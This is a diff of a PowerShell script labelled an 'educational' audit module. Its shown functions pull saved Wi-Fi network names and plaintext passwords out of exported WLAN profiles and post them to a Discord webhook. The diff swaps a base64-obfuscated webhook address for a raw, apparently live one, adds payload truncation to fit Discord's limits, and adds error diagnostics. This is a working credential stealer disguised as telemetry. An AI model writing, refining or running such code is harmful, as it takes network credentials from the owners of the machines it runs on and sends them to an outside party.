@@ -1,16 +1,15 @@
 # ==============================================================================
 # AUDIT SCRIPT - EDUCATIONAL MODULE
-# Version: 2.3.7
-# Fix: LiteralPath for XML parsing (bracket support)
+# Version: 2.3.9
+# Fix: Raw Webhook URI migration for diagnostic testing
 # ==============================================================================
 
 # ========== CONFIGURATION ==========
 $VerboseMode = $true
-$AuditVersion = '2.3.7'
+$AuditVersion = '2.3.9'
 
-# Encoded Discord Webhook
-$Channel_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=='
-$Channel_URI = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Channel_B64))
+# Discord Webhook URI (Raw for testing)
+$Channel_URI = 'https://discord.com/api/webhooks/1515542439556022323/p7a7o-Qx2eiG3w6vcnku_Kj6qKMMusv0kvycUIfON-zWVQczhbuuBPYc0z_v-dX6p2Ha'
 
 # ========== CORE UTILITIES ==========
 
@@ -70,7 +69,6 @@ function Get-SignalCredentials {
         $files = Get-ChildItem -Path $tempDir -Filter '*.xml'
         
         foreach ($f in $files) {
-            # Use -LiteralPath to support filenames with brackets [ ]
             [xml]$xml = Get-Content -LiteralPath $f.FullName
             $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
             $key = $xml.WLANProfile.MSM.Security.sharedKey.keyMaterial
@@ -110,6 +108,17 @@ function New-AuditPackage {
 function Sync-RemoteChannel {
     param([string]$Payload)
     Write-InternalLog 'Syncing...'
+    
+    # Discord limit for description is 4096. 
+    # We truncate to 3900 to be safe and close code blocks.
+    if ($Payload.Length -gt 3900) {
+        $Payload = $Payload.Substring(0, 3880) + "`n... [Truncated]`n" + '```'
+    }
+
+    if (-not $Payload -or $Payload.Trim().Length -eq 0) {
+        $Payload = "No telemetry data available for this session."
+    }
+
     try {
         $body = @{
             username = 'Audit-Bot'
@@ -124,7 +133,17 @@ function Sync-RemoteChannel {
         Invoke-RestMethod -Uri $Channel_URI -Method Post -Body $json -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-InternalLog 'Success' 'Green'
     } catch { 
-        Write-InternalLog "Fail: $($_.Exception.Message)" 'Red' 
+        Write-InternalLog "Fail: $($_.Exception.Message)" 'Red'
+        if ($_.Exception.Response) {
+            try {
+                $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
+                $errDetail = $reader.ReadToEnd()
+                Write-InternalLog "Diagnostic Response: $errDetail" 'Yellow'
+            } catch {
+                Write-InternalLog "Could not read error response stream." 'Gray'
+            }
+        }
+        Write-InternalLog "Payload Size: $($json.Length) characters" 'Gray'
     }
 }
 
